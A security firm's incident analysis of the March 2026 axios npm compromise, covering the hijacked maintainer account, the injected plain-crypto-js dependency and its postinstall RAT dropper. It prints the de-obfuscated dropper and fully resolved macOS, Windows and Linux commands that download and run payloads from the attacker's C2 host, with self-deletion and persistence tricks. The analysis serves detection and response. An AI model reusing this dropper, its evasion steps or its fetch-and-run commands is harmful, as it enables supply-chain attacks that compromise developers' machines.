---
title: axios Compromised on npm - Malicious Versions Drop Remote Access Trojan - StepSecurity
url: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
site_name: hackernews_api
content_file: hackernews_api-axios-compromised-on-npm-malicious-versions-drop-r
fetched_at: '2026-03-31T11:22:19.325738'
original_url: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
author: mtud
date: '2026-03-31'
description: Hijacked maintainer account used to publish poisoned axios releases including 1.14.1 and 0.30.4. The attacker injected a hidden dependency that drops a cross platform RAT. We are actively investigating and will update this post with a full technical analysis.
tags:
- hackernews
- trending
---

Back to Blog

News

# axios Compromised on npm - Malicious Versions Drop Remote Access Trojan

Hijacked maintainer account used to publish poisoned axios releases including 1.14.1 and 0.30.4. The attacker injected a hidden dependency that drops a cross platform RAT. We are actively investigating and will update this post with a full technical analysis.
Ashish Kurmi
View LinkedIn

March 30, 2026

Share on X
Share on X
Share on LinkedIn
Share on Facebook
Follow our RSS feed

Table of Contents
Loading nav...

StepSecurity is hosting a community town hall on this incident on April 1st at 10:00 AM PT -Register Here.

axios is the most popular JavaScript HTTP client library with over 100 million weekly downloads. On March 30, 2026, StepSecurity identified two malicious versions of the widely usedaxiosHTTP client library published to npm:axios@1.14.1andaxios@0.30.4. The malicious versions inject a new dependency,plain-crypto-js@4.2.1, which is never imported anywhere in the axios source code. Its sole purpose is to execute apostinstallscript that acts as a cross platform remote access trojan (RAT) dropper, targeting macOS, Windows, and Linux. The dropper contacts a live command and control server and delivers platform specific second stage payloads. After execution, the malware deletes itself and replaces its ownpackage.jsonwith a clean version to evade forensic detection.

There are zero lines of malicious code inside axios itself, and that's exactly what makes this attack so dangerous. Both poisoned releases inject a fake dependency,plain-crypto-js@4.2.1, a package never imported anywhere in the axios source, whose sole purpose is to run a postinstall script that deploys a cross-platform remote access trojan. The dropper contacts a live command-and-control server, delivers separate second-stage payloads for macOS, Windows, and Linux, then erases itself and replaces its ownpackage.jsonwith a clean decoy. A developer who inspects theirnode_modulesfolder after the fact will find no indication anything went wrong.

This was not opportunistic. It was precision. The malicious dependency was staged 18 hours in advance. Three payloads were pre-built for three operating systems. Both release branches were poisoned within 39 minutes of each other. Every artifact was designed to self-destruct. Within two seconds ofnpm install, the malware was already calling home to the attacker's server before npm had even finished resolving dependencies. This is among the most operationally sophisticated supply chain attacks ever documented against a top-10 npm package.

These compromises were detected by StepSecurity AI Package Analyst [1][2] andStepSecurity Harden-Runner.We have responsiblydisclosedthe issue to the project maintainers.

StepSecurity Harden-Runner, whose community tier is free for public repos and is used by over 12,000 public repositories, detected the compromised axios package making anomalous outbound connections to the attacker's C2 domain across multiple open source projects. For example, Harden-Runner flagged the C2 callback to sfrclak.com:8000 during a routine CI run in the backstage repository, one of the most widely used developer portal frameworks. The Backstage team has confirmed that this workflow is intentionally sandboxed and the malicious package install does not impact the project. The connection was automatically marked as anomalous because it had never appeared in any prior workflow run. Harden-Runner insights for community tier projects are public by design, allowing anyone to verify the detection:https://app.stepsecurity.io/github/backstage/backstage/actions/runs/23775668703?tab=network-events

[Community Webinar] axios Compromised on npm: What We Know, What You Should Do

Join StepSecurity on April 1st at 10:00 AM PT for a live community briefing on the axios supply chain attack. We'll walk through the full attack chain, indicators of compromise, remediation steps, and open it up for Q&A.

Register for the webinar →

## Attack Timeline

The attack was pre-staged across roughly 18 hours, with the malicious dependency seeded on npm before the axios releases to avoid “brand-new package” alarms from security scanners:

Timestamp (UTC)

Event

2026-03-30 05:57

plain-crypto-js@4.2.0
 published by 
nrwise@proton.me
 — a clean decoy containing a full copy of the legitimate 
crypto-js
 source, no 
postinstall
 hook. Its sole purpose is to establish npm publishing history so the package does not appear as a zero-history account during later inspection.

2026-03-30 23:59

plain-crypto-js@4.2.1
 published by 
nrwise@proton.me
 — malicious payload added. The 
postinstall: "node setup.js"
 hook and obfuscated dropper are introduced.

2026-03-31 00:21

axios@1.14.1
 published by compromised 
jasonsaayman
 account (email: 
ifstap@proton.me
) — injects 
plain-crypto-js@4.2.1
 as a runtime dependency, targeting the modern 1.x user base.

2026-03-31 01:00

axios@0.30.4
 published by the same compromised account — identical injection into the legacy 0.x branch, published 39 minutes later to maximize coverage across both release lines.

2026-03-31 ~03:15

npm unpublishes 
axios@1.14.1
 and 
axios@0.30.4
. Both versions are removed from the registry and the 
latest
 dist-tag reverts to 
1.14.0
. 
axios@1.14.1
 had been live for approximately 2 hours 53 minutes; 
axios@0.30.4
 for approximately 2 hours 15 minutes. Timestamp is inferred from the axios registry document's 
modified
 field (03:15:30Z) — npm does not expose a dedicated per-version unpublish timestamp in its public API.

2026-03-31 03:25

npm initiates a security hold on 
plain-crypto-js
, beginning the process of replacing the malicious package with an npm security-holder stub.

2026-03-31 04:26

npm publishes the security-holder stub 
plain-crypto-js@0.0.1-security.0
 under the 
npm@npmjs.com
 account, formally replacing the malicious package on the registry. 
plain-crypto-js@4.2.1
 had been live for approximately 4 hours 27 minutes. Attempting to install any version of 
plain-crypto-js
 now returns the security notice.

## How the Attack Works

### Step 1 - Maintainer Account Hijack

The attacker compromised thejasonsaaymannpm account, the primary maintainer of the axios project. The account’s registered email was changed toifstap@proton.me— an attacker-controlled ProtonMail address. Using this access, the attacker published malicious builds across both the 1.x and 0.x release branches simultaneously, maximizing the number of projects exposed.

Bothaxios@1.14.1andaxios@0.30.4are recorded in the npm registry as published byjasonsaayman, making them indistinguishable from legitimate releases at a glance. Both versions were published using the compromised npm credentials of a lead axios maintainer, bypassing the project's normal GitHub Actions CI/CD pipeline.

A critical forensic signal is visible in the npm registry metadata. Every legitimate axios 1.x release is published via GitHub Actions with npm’s OIDC Trusted Publisher mechanism, meaning the publish is cryptographically tied to a verified GitHub Actions workflow.axios@1.14.1breaks that pattern entirely — published manually via a stolen npm access token with no OIDC binding and nogitHead:

// axios@1.14.0 — LEGITIMATE

"_npmUser"
: {

 
"name"
: 
"GitHub Actions"
,

 
"email"
: 
"npm-oidc-no-reply@github.com"
,

 
"trustedPublisher"
: {

 
"id"
: 
"github"
,

 
"oidcConfigId"
: 
"oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"

 }

}

// axios@1.14.1 — MALICIOUS

"_npmUser"
: {

 
"name"
: 
"jasonsaayman"
,

 
"email"
: 
"ifstap@proton.me"

 
// no trustedPublisher, no gitHead, no corresponding GitHub commit or tag

}

There is no commit or tag in the axios GitHub repository that corresponds to1.14.1. The release exists only on npm. The OIDC token that legitimate releases use is ephemeral and scoped to the specific workflow — it cannot be stolen. The attacker must have obtained a long-lived classic npm access token for the account.

### Step 2 - Staging the Malicious Dependency

Before publishing the malicious axios versions, the attacker pre-stagedplain-crypto-js@4.2.1from accountnrwise@proton.me. This package:

* Masquerades ascrypto-jswith an identical description and repository URL pointing to the legitimatebrix/crypto-jsGitHub repository
* Contains"postinstall": "node setup.js"— the hook that fires the RAT dropper on install
* Pre-stages a cleanpackage.jsonstub in a file namedpackage.mdfor evidence destruction after execution

The decoy version (4.2.0) was published 18 hours earlier to establish publishing history - a clean package in the registry that makesnrwiselook like a legitimate maintainer.

### plain-crypto-js: Complete Package Anatomy

#### What changed between 4.2.0 (decoy) and 4.2.1 (malicious)

A complete file-level comparison betweenplain-crypto-js@4.2.0andplain-crypto-js@4.2.1reveals exactly three differences. Every other file (all 56 crypto source files, the README, the LICENSE, and the docs) is identical between the two versions:

File

In 4.2.0

In 4.2.1

Change

package.json

no 
scripts
 section

"postinstall": "node setup.js"
 added

Modified: weapon added

setup.js

Not present

4.2 KB obfuscated dropper

Added: the RAT dropper

package.md

Not present

Clean JSON stub reporting version 
4.2.0

Added: the anti-forensics cover

The 56 crypto source files are not just similar; they arebit-for-bit identicalto the corresponding files in the legitimatecrypto-js@4.2.0package published by Evan Vosberg. The attacker made no modifications to the cryptographic library code whatsoever. This was intentional: any diff-based analysis comparingplain-crypto-jsagainstcrypto-jswould find nothing suspicious in the library files and would focus attention onpackage.json— where thepostinstallhook looks, at a glance, like a standard build or setup task.

#### The version spoofing trick inpackage.md

The anti-forensics stub (package.md) deserves particular attention. Aftersetup.jsruns, it renamespackage.mdtopackage.json. The stub reports version4.2.0— not4.2.1:

// Contents of package.md (the clean replacement stub)

{

 
"name"
: 
"plain-crypto-js"
,

 
"version"
: 
"4.2.0"
, 
// ← reports 4.2.0, not 4.2.1 — deliberate mismatch

 
"description"
: 
"JavaScript library of crypto standards."
,

 
"license"
: 
"MIT"
,

 
"author"
: { 
"name"
: 
"Evan Vosberg"
, 
"url"
: 
"http://github.com/evanvosberg"
 },

 
"homepage"
: 
"http://github.com/brix/crypto-js"
,

 
"repository"
: { 
"type"
: 
"git"
, 
"url"
: 
"http://github.com/brix/crypto-js.git"
 },

 
"main"
: 
"index.js"
,

 
// No "scripts" key — no postinstall, no test

 
"dependencies"
: {}

}

This creates a secondary deception layer. After infection, runningnpm listin the project directory will reportplain-crypto-js@4.2.0— becausenpm listreads theversionfield from the installedpackage.json, which now says4.2.0. An incident responder checking installed packages would see a version number that does not match the malicious4.2.1version they were told to look for, potentially leading them to conclude the system was not compromised.

# What npm list reports POST-infection (after the package.json swap):

$ npm list plain-crypto-js
myproject@1.0.0
└── plain-crypto-js@
4.2.0
 
# ← reports 4.2.0, not 4.2.1

 
# but the dropper already ran as 4.2.1

# The reliable check is the DIRECTORY PRESENCE, not the version number:

$ ls node_modules/plain-crypto-js

aes.js cipher-core.js core.js ...

# If this directory exists at all, the dropper ran.
# plain-crypto-js is not a dependency of ANY legitimate axios version.

The difference between the realcrypto-js@4.2.0and the maliciousplain-crypto-js@4.2.1is a single field inpackage.json:

// crypto-js@4.2.0 (LEGITIMATE — Evan Vosberg / brix)

{

 
"name"
: 
"crypto-js"
,

 
"version"
: 
"4.2.0"
,

 
"description"
: 
"JavaScript library of crypto standards."
,

 
"author"
: 
"Evan Vosberg"
,

 
"homepage"
: 
"http://github.com/brix/crypto-js"
,

 
"scripts"
: {

 
"test"
: 
"grunt"
 
// ← no postinstall

 }

}

// plain-crypto-js@4.2.1 (MALICIOUS — nrwise@proton.me)

{

 
"name"
: 
"plain-crypto-js"
, 
// ← different name, everything else cloned

 
"version"
: 
"4.2.1"
, 
// ← version one ahead of the real package

 
"description"
: 
"JavaScript library of crypto standards."
,

 
"author"
: { 
"name"
: 
"Evan Vosberg"
 }, 
// ← fraudulent use of real author name

 
"homepage"
: 
"http://github.com/brix/crypto-js"
, 
// ← real repo, wrong package

 
"scripts"
: {

 
"test"
: 
"grunt"
,

 
"postinstall"
: 
"node setup.js"
 
// ← THE ONLY DIFFERENCE. The entire weapon.

 }

}

‍

### Step 3 - Injecting the Dependency into axios

The attacker publishedaxios@1.14.1andaxios@0.30.4withplain-crypto-js: "^4.2.1"added as a runtime dependency — a package that has never appeared in any legitimate axios release. The diff is surgical: every other dependency is identical to the prior clean version.

Dependency comparison between clean and compromised versions:

* axios@1.14.0 — follow-redirects, form-data, proxy-from-env [CLEAN]
* axios@1.14.1 — follow-redirects, form-data, proxy-from-env, plain-crypto-js@^4.2.1 [MALICIOUS]
* axios@0.30.3 — follow-redirects, form-data, proxy-from-env [CLEAN]
* axios@0.30.4 — follow-redirects, form-data, proxy-from-env, plain-crypto-js@^4.2.1 [MALICIOUS]

When a developer runsnpm install axios@1.14.1, npm resolves the dependency tree and installsplain-crypto-js@4.2.1automatically. npm then executesplain-crypto-js’spostinstallscript, launching the dropper.

Phantom dependency:A grep across all 86 files inaxios@1.14.1confirms thatplain-crypto-jsis never imported orrequire()’d anywhere in the axios source code. It is added topackage.jsononly to trigger thepostinstallhook. A dependency that appears in the manifest but has zero usage in the codebase is a high-confidence indicator of a compromised release.

### The Surgical Precision of the Injection

A complete binary diff betweenaxios@1.14.0andaxios@1.14.1across all 86 files (excluding source maps) reveals thatexactly one file changed:package.json. Every other file — all 85 library source files, type definitions, README, CHANGELOG, and compiled dist bundles — is bit-for-bit identical between the two versions.

# File diff: axios@
1.14
.0
 vs axios@
1.14
.1
 (
86
 files, source maps excluded)

DIFFERS
: package.json

Total differing files: 
1

Files only 
in
 
1.14
.1
: (none)

Files only 
in
 
1.14
.0
: (none)

The completepackage.jsondiff:

# --- axios/package.json (1.14.0)

# +++ axios/package.json (1.14.1)

- "version": "1.14.0",

+ "version": "1.14.1",

 "scripts": {

 "fix": "eslint --fix lib/**/*.js",

- "prepare": "husky"

 },

 "dependencies": {

 "follow-redirects": "^2.1.0",

 "form-data": "^4.0.1",

 "proxy-from-env": "^2.1.0",

+ "plain-crypto-js": "^4.2.1"

 }

Two changes are visible: the version bump (1.14.0 → 1.14.1) and the addition ofplain-crypto-js. There is also a third, less obvious change: the"prepare": "husky"script was removed.huskyis the git hook manager used by the axios project to enforce pre-commit checks. Its removal from thescriptssection is consistent with a manual publish that bypassed the normal development workflow — the attacker editedpackage.jsondirectly without going through the project's standard release tooling, which would have re-added the husky prepare script.

The same analysis applies toaxios@0.30.3 → axios@0.30.4:

# --- axios/package.json (0.30.3)

# +++ axios/package.json (0.30.4)

- "version": "0.30.3",

+ "version": "0.30.4",

 "dependencies": {

 "follow-redirects": "^1.15.4",

 "form-data": "^4.0.4",

 "proxy-from-env": "^1.1.0",

+ "plain-crypto-js": "^4.2.1"

 }

Again — exactly one substantive change: the malicious dependency injection. The version bump itself (from0.30.3to0.30.4) is simply the required npm version increment to publish a new release; it carries no functional significance.

‍

### The RAT Dropper:setup.js- Static Analysis

setup.jsis a single minified file employing a two-layer obfuscation scheme designed to evade static analysis tools and confuse human reviewers.

#### Obfuscation Technique

All sensitive strings — module names, OS identifiers, shell commands, the C2 URL, and file paths — are stored as encoded values in an array namedstq[]. Two functions decode them at runtime:

_trans_1(x, r)— XOR cipher. The key"OrDeR_7077"is parsed through JavaScript’sNumber(): alphabetic characters produceNaN, which in bitwise operations becomes0. Only the digits7,0,7,7in positions 6–9 survive, giving an effective key of[0,0,0,0,0,0,7,0,7,7]. Each character at positionris decoded as:

charCode XOR key[(
7
 × r × r) % 
10
] XOR 
333

‍

_trans_2(x, r)— Outer layer. Reverses the encoded string, replaces_with=, base64-decodes the result (interpreting the bytes as UTF-8 to recover Unicode code points), then passes the output through_trans_1.

The dropper’s entry point is_entry("6202033"), where6202033is the C2 URL path segment. The full C2 URL is:http://sfrclak.com:8000/6202033

#### Fully Decoded Strings

StepSecurity fully decoded every entry in thestq[]array. The recovered plaintext reveals the complete attack:

stq[
0
] → 
"child_process"
 
// shell execution

stq[
1
] → 
"os"
 
// platform detection

stq[
2
] → 
"fs"
 
// filesystem operations

stq[
3
] → 
"http://sfrclak.com:8000/"
 
// C2 base URL

stq[
5
] → 
"win32"
 
// Windows platform identifier

stq[
6
] → 
"darwin"
 
// macOS platform identifier

stq[
12
] → 
"curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &"

stq[
13
] → 
"package.json"
 
// deleted after execution

stq[
14
] → 
"package.md"
 
// clean stub renamed to package.json

stq[
15
] → 
".exe"

stq[
16
] → 
".ps1"

stq[
17
] → 
".vbs"

The complete attack path fromnpm installto C2 contact and cleanup, across all three target platforms.

### Full Annotated Walkthrough ofsetup.js

With all strings decoded, the dropper's full logic can be reconstructed and annotated. The following is a de-obfuscated, commented version of the_entry()function that constitutes the entire dropper payload. Original variable names are preserved; comments are added for clarity.

// setup.js — de-obfuscated and annotated

// SHA-256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09

const
 _entry = 
function
(
campaignId
) 
{

 
try
 {

 
// Load Node.js built-in modules via decoded string table

 
const
 fs = 
require
(
"fs"
); 
// stq[2]

 
const
 os = 
require
(
"os"
); 
// stq[1]

 
const
 { execSync } = 
require
(
"child_process"
); 
// stq[0]

 
// Build the full C2 URL: base + campaign ID

 
// stq[3] = "http://sfrclak.com:8000/"

 
const
 c2Url = 
"http://sfrclak.com:8000/"
 + campaignId;

 
// → "http://sfrclak.com:8000/6202033"

 
// Detect the operating system

 
const
 platform = os.platform(); 
// "darwin", "win32", or other

 
const
 tmpDir = os.tmpdir(); 
// "/tmp" on Linux/macOS, "%TEMP%" on Windows

 
// os.type(), os.release(), os.arch() are called but results discarded —

 
// likely sends them via the POST body or they are used in the stage-2

 os.type(); os.release(); os.arch();

 
let
 execCommand = 
""
;

 
// ─────────────────────────────────────────────────

 
// BRANCH 1: macOS (darwin)

 
// ─────────────────────────────────────────────────

 
if
 (platform === 
"darwin"
) {

 
const
 scriptPath = tmpDir + 
"/"
 + campaignId; 
// /tmp/6202033

 
const
 appleScript = 
`

 set {a, s, d} to {"", "
${c2Url}
", "/Library/Caches/com.apple.act.mond"}

 try

 do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \\"" & d & " " & s & " &\\" &> /dev/null"

 end try

 do shell script "rm -rf 
${scriptPath}
"`
;

 fs.writeFileSync(scriptPath, appleScript);

 execCommand = 
`nohup osascript "
${scriptPath}
" > /dev/null 2>&1 &`
;

 
// ─────────────────────────────────────────────────

 
// BRANCH 2: Windows (win32)

 
// ─────────────────────────────────────────────────

 } 
else
 
if
 (platform === 
"win32"
) {

 
const
 psPath = execSync(
"where powershell"
).toString().trim();

 
const
 wtPath = process.env.PROGRAMDATA + 
"\\wt.exe"
;

 
if
 (!fs.existsSync(wtPath)) {

 fs.copyFileSync(psPath, wtPath);

 
// Creates a persistent copy of PowerShell. wt.exe is Windows Terminal's

 
// binary name — a legitimate-looking process in %PROGRAMDATA%.

 }

 
const
 ps1Path = tmpDir + 
"\\"
 + campaignId + 
".ps1"
; 
// %TEMP%\6202033.ps1

 
const
 vbsPath = tmpDir + 
"\\"
 + campaignId + 
".vbs"
; 
// %TEMP%\6202033.vbs

 
const
 vbScript = 
`

 Set objShell = CreateObject("WScript.Shell")

 objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""
${c2Url}
"" > ""
${ps1Path}
"" & ""
${wtPath}
"" -w hidden -ep bypass -file ""
${ps1Path}
"" ""
${c2Url}
"" & del ""
${ps1Path}
"" /f", 0, False`
;

 fs.writeFileSync(vbsPath, vbScript);

 execCommand = 
`cscript "
${vbsPath}
" //nologo && del "
${vbsPath}
" /f`
;

 
// ─────────────────────────────────────────────────

 
// BRANCH 3: Linux / other

 
// ─────────────────────────────────────────────────

 } 
else
 {

 execCommand = 
`curl -o /tmp/ld.py -d packages.npm.org/product2 -s 
${c2Url}
 && nohup python3 /tmp/ld.py 
${c2Url}
 > /dev/null 2>&1 &`
;

 
// curl and nohup chained with &&: nohup only runs if curl succeeded.

 
// If the C2 is unreachable, chain silently fails — npm install still exits 0.

 }

 
// execSync is blocking, but all three commands return immediately because

 
// the real work is detached to background processes (nohup / cscript 0,False)

 execSync(execCommand);

 
// ─────────────────────────────────────────────────

 
// ANTI-FORENSICS: cover tracks

 
// ─────────────────────────────────────────────────

 
const
 selfPath = __filename;

 fs.unlink(selfPath, 
() =>
 {}); 
// 1. Delete setup.js itself

 fs.unlink(
"package.json"
, 
() =>
 {}); 
// 2. Delete malicious package.json

 fs.rename(
"package.md"
, 
"package.json"
, 
() =>
 {}); 
// 3. Install clean v4.2.0 stub

 } 
catch
(e) {

 
// Silent catch — any error (C2 unreachable, permission denied, etc.)

 
// is swallowed completely. npm install always exits with code 0.

 
// The developer never sees any indication that anything went wrong.

 }

};

// Entry point — "6202033" is the campaign/tracking ID

_entry(
"6202033"
);

#### Critical design details

1. Silent failure via top-leveltry/catch. The entire_entry()function is wrapped in a singletry/catchthat swallows all errors with an empty handler. If the C2 is unreachable, if the user has no write permission to the target path, or if any step fails, the dropper exits silently andnpm installcompletes with exit code0. There is no error output, no warning, nothing.
2. execSyncis blocking, but the payloads are not. The dropper usesexecSync(execCommand)— a synchronous, blocking call. However, all three platform execution commands end with&(Linux/macOS) or usecscript ... 0, False(Windows), which immediately detach the process and return. SoexecSyncreturns almost instantly — the dropper doesn't blocknpm installfor more than a fraction of a second.
3. The&&chain on Linux is a liveness check.curl ... && nohup python3 ...— ifcurlfails (C2 unreachable, no network), thenohupcommand never executes. This ensuresnpm installnever fails, even when the C2 is unavailable.
4. The WindowscopyFileSyncconditional creates persistence.if (!fs.existsSync(wtPath)) { fs.copyFileSync(psPath, wtPath); }— the copy only runs if%PROGRAMDATA%\wt.exedoes not already exist. Once created, this file persists across reinstalls and reboots. Even if the victim removesplain-crypto-jsand reinstalls clean dependencies,wt.exeremains in%PROGRAMDATA%as a dormant copy of PowerShell available to any future payload.

## Platform-Specific Payloads

#### macOS — AppleScript Dropper

On macOS (darwin), the dropper writes an AppleScript to/tmp/6202033and executes it silently vianohup osascript. The AppleScript contacts C2 with POST bodypackages.npm.org/product0, downloads the macOS RAT binary, saves it to/Library/Caches/com.apple.act.mond(mimicking an Apple system cache file), makes it executable (chmod 770), and launches it via/bin/zsh. The script then deletes itself.

The namecom.apple.act.mondlikely abbreviates "Activity Monitor Daemon" to blend with legitimate Apple processes using Apple's reverse-DNS daemon naming convention.

#### Windows — VBScript + PowerShell Dropper

On Windows (win32):

1. Runswhere powershellto locate the binary
2. Copies PowerShell to%PROGRAMDATA%\wt.exe(disguised as Windows Terminal)
3. Writes a VBScript (.vbs) to temp directory, executed viacscript //nologoin a hiddencmd.exewindow
4. The VBScript runscurlto fetch the PowerShell stage-2 to%TEMP%\6202033.ps1, executes it with-WindowStyle Hiddenand-ExecutionPolicy Bypass, then self-deletes

Persistent artifact:%PROGRAMDATA%\wt.exe(copy of PowerShell).

#### Linux — Python Dropper

On Linux and all other platforms:

curl -o /tmp/ld.py \

 -d packages.npm.org/product2 \

 -s http:
//sfrclak.com:8000/6202033 \

&& nohup python3 /tmp/ld.py http:
//sfrclak.com:8000/6202033 > /dev/null 2>&1 &

C2 returns a Python RAT script saved to/tmp/ld.pyand executed in background, detached from the npm process tree.

### Complete Platform Payloads (Fully Resolved)

The following are the complete, fully resolved payloads as they execute on victim machines, with all template placeholders replaced with actual values using campaign ID6202033and C2 base URLhttp://sfrclak.com:8000/.

#### macOS — Full AppleScript written to/tmp/6202033

-- Written to: 
/tmp/
6202033

-- Executed via: nohup osascript 
"/tmp/6202033"
 > 
/dev/
null
 
2
>&
1
 &

-- This file is deleted by the script itself 
in
 the final 
do
 shell script line

set {a, s, d} to {
""
, 
"http://sfrclak.com:8000/6202033"
, 
"/Library/Caches/com.apple.act.mond"
}

 
try

 
do
 shell script 
"curl -o "
 & d & a & 
" -d packages.npm.org/product0"
 & 
" -s "
 & s & 
" && chmod 770 "
 & d & 
" && /bin/zsh -c \""
 & d & 
" "
 & s & 
" &\" &> /dev/null"

 end 
try

do
 shell script 
"rm -rf /tmp/6202033"

When executed, this AppleScript expands to the following shell command:

curl -o /Library/Caches/com.apple.act.mond \

 -d packages.npm.org/product0 \

 -s http:
//sfrclak.com:8000/6202033 \

 && chmod 
770
 /Library/Caches/com.apple.act.mond \

 && 
/bin/
zsh -c 
"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
 \

 >& 
/dev/
null

#### Windows — Full VBScript written to%TEMP%\6202033.vbs

' Written to: %TEMP%\6202033.vbs

'
 Executed via: cscript 
"%TEMP%\6202033.vbs"
 
//nologo && del "%TEMP%\6202033.vbs" /f

' objShell.Run arg 2=0 (hidden window), arg 3=False (don'
t wait 
for
 completion)

Set
 objShell = CreateObject(
"WScript.Shell"
)

objShell.Run 
"cmd.exe /c curl -s -X POST -d "
"packages.npm.org/product1"
" "
"http://sfrclak.com:8000/6202033"
" > "
"%TEMP%\6202033.ps1"
" & "
"powershell.exe"
" -w hidden -ep bypass -file "
"%TEMP%\6202033.ps1"
" "
"http://sfrclak.com:8000/6202033"
" & del "
"%TEMP%\6202033.ps1"
" /f"
, 
0
, False

#### Linux — DirectexecSyncshell command

# Executed directly via execSync() 
in
 Node.js — no intermediate file

curl -o /tmp/ld.py \

 -d packages.npm.org/product2 \

 -s http:
//sfrclak.com:8000/6202033 \

 && nohup python3 /tmp/ld.py http:
//sfrclak.com:8000/6202033 > /dev/null 2>&1 &

The&at the end detachesnohupfrom the shell started byexecSync, causing it to be re-parented to PID 1 (init) when that shell exits, as confirmed in the Harden-Runner process events wherenohup(PID 2400) showsppid: 1.

#### Platform detection and the "other" case

The dropper'sif/else if/elsechain coversdarwin,win32, and everything else (Linux). There is no explicit check for"linux"— anything that is not macOS or Windows falls through to the Linux command. This means the dropper also targetsFreeBSD, Android (Node.js on Termux), and any other Unix-like systemwherecurlandpython3are available. Container environments running Node.js are equally affected.

Each platform sends a distinct POST body to the same C2 endpoint:

* macOS:packages.npm.org/product0
* Windows:packages.npm.org/product1
* Linux:packages.npm.org/product2

Thepackages.npm.org/prefix attempts to make traffic appear as benign npm registry communication in network logs and SIEMs.

### Self-Cleanup - Hiding the Evidence

After launching the platform-specific payload,setup.jsperforms three forensic cleanup steps in sequence:

1. Deletes itself —fs.unlink(__filename)removessetup.jsfromnode_modules/plain-crypto-js/
2. Deletespackage.json— removes the file containing"postinstall": "node setup.js"
3. Renamespackage.mdtopackage.json— the pre-staged clean stub (reporting version 4.2.0, no scripts) replaces the malicious manifest

Post-infection inspection ofnode_modules/plain-crypto-js/package.jsonshows a completely clean manifest. Runningnpm auditreveals nothing. The only persistent evidence is the existence of thenode_modules/plain-crypto-js/directory itself — this package never appeared in any legitimate axios version.

Why the directory presence still matters: Even after cleanup, the existence ofnode_modules/plain-crypto-js/is sufficient evidence of compromise — this package is not a dependency of any legitimate axios version. If you find this directory, the dropper ran.

## Runtime Execution Validation with StepSecurity Harden-Runner

Static analysis of the obfuscated dropper told uswhatthe malware intended to do. To confirm it actually executes as designed, we installedaxios@1.14.1inside a GitHub Actions runner instrumented withStepSecurity Harden-Runnerin audit mode. Harden-Runner captures every outbound network connection, every spawned process, and every file write at the kernel level — without interfering with execution in audit mode, giving us a complete ground-truth picture of what happens the momentnpm installruns.

The full Harden-Runner insights for this run are publicly accessible:app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/23776116077

### Network Events: C2 Contact Confirmed Across Two Workflow Steps

The network event log contains two outbound connections tosfrclak.com:8000— but what makes this particularly significant is when they occur:

* Step: Install axios 1.14.1 — 01:30:51Z    PID 2401 •curl→ sfrclak.com:8000 • calledBy: infra
* Step: Verify axios import and version — 01:31:27Z    PID 2400 •nohup→ sfrclak.com:8000 • calledBy: infra

Two things stand out immediately:

* The first C2 connection (curl, PID 2401) fires 1.1 seconds into the npm install — at01:30:51Z, just 2 seconds afternpm installbegan at01:30:49Z. Thepostinstallhook triggered, decoded its strings, and was making an outbound HTTP connection to an external server before npm had finished resolving all dependencies.
* The second C2 connection (nohup, PID 2400) occurs 36 seconds later, in an entirely different workflow step — “Verify axios import and version.” The npm install step was long finished. The malware had persisted into subsequent steps, running as a detached background process. This is the stage-2 Python payload (/tmp/ld.py) making a callback — alive and independent of the process that spawned it.

Why both connections showcalledBy: "infra":When Harden-Runner can trace a network call to a specific Actions step through the runner process tree, it labels it"runner". The"infra"label means the process making the connection could not be attributed to a specific step — because the dropper usednohup ... &to detach from the process tree. The process was deliberately orphaned to PID 1 (init), severing all parent-child relationships. This is the malware actively evading process attribution.

### Process Tree: The Full Kill Chain as Observed at Runtime

Harden-Runner captures everyexecvesyscall. The raw process events reconstruct the exact execution chain fromnpm installto C2 contact:

PID 
2366
 bash /home/runner/work/_temp
/***.sh [01:30:48.186Z]

 └─ PID 2380 env node npm install axios@1.14.1 [01:30:49.603Z]

 └─ PID 2391 sh -c "node setup.js" [01:30:50.954Z]

 │ cwd: node_modules/plain-crypto-js ← postinstall hook fires

 └─ PID 2392 node setup.js [01:30:50.955Z]

 │ cwd: node_modules/plain-crypto-js

 └─ PID 2399 /bin/sh -c "curl -o /tmp/ld.py \ [01:30:50.978Z]

 -d packages.npm.org/product2 \

 -s http://sfrclak.com:8000/6202033 \

 && nohup python3 /tmp/ld.py \

 http://sfrclak.com:8000/6202033 \

 > /dev/null 2>&1 &"

PID 2401 curl -o /tmp/ld.py -d packages.npm.org/product2 [01:30:50.979Z]

 ppid: 2400 ← child of nohup

PID 2400 nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 [01:31:27.732Z]

 ppid: 1 ← ORPHANED TO INIT — detached from npm process tree

‍

The process tree confirms the exact execution chain decoded statically fromsetup.js. Four levels of process indirection separate the originalnpm installfrom the C2 callback:npm → sh → node → sh → curl/nohup. Thenohupprocess (PID 2400) reportingppid: 1is the technical confirmation of the daemonization technique — by the timenpm installreturned successfully, a detached process was already running/tmp/ld.pyin the background.

### File Events: The Evidence Swap Caught in Real Time

The file event log captures every file write by PID. Theplain-crypto-js/package.jsonentry shows two writes from two different processes — directly confirming the anti-forensics technique described in static analysis:

File: node_modules/plain-crypto-js/package.json

 Write 
1
 — pid=
2380
 (npm install) ts=
01
:
30
:
50.
905Z

 Malicious package.json written to disk during install.

 
Contains
: { 
"postinstall"
: 
"node setup.js"
 }

 Write 
2
 — pid=
2392
 (node setup.js) ts=
01
:
31
:
27.
736Z [+36s]

 Dropper overwrites package.json 
with
 clean stub 
from
 package.md.

 
Contains
: version 
4.2
.0
 manifest, no scripts, no postinstall.

‍

The 36-second gap between the two writes is the execution time of the dropper — it wrote the second file only after successfully launching the background payload. Harden-Runner flagged this as a“Source Code Overwritten”file integrity event. Post-infection, any tool that readsnode_modules/plain-crypto-js/package.jsonwill see the clean manifest. The write event log is the only runtime artifact that proves the swap occurred.

## Indicators of Compromise

Malicious npm Packages

* axios@1.14.1 · shasum: 2553649f232204966871cea80a5d0d6adc700ca
